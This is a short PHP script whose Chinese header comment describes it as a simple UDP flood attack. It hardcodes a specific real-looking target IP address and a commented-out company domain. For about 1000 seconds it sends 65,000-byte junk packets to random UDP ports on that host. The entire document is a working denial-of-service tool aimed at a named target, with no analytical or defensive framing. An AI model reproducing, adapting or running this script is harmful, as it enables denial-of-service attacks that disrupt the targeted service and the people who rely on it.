<?php
/**
 *  基于UCP 的FLOOD攻击，很简单的一个脚本
 */
//$host = 'cn.memebox.com'; //需要进行更换，建议换成IP
$host = '54.223.98.255';
$time = 1000; //UDP包发送的间隔时间

$out= '';

if(strlen($host) and strlen($time)) {
	$pacotes = 0;

	set_time_limit(0);

	$tempo=time();
	$tempo_maximo=$tempo+$time;

	$host=htmlspecialchars($host);
	for ($i=0; $i < 65000; $i++) {
		$out .= 'X';
	}
	while(1) {
		$pacotes++;
		if(time() > $tempo_maximo) {
			break;
		}
		$gerar = rand(1,65000);
		$abrir=fsockopen("udp://".$host,$gerar,$errno,$errstr,5);
		if($abrir) {
			fwrite($abrir, $out);
			fclose($abrir);
		}
	}
	echo "udp flood send over!";
}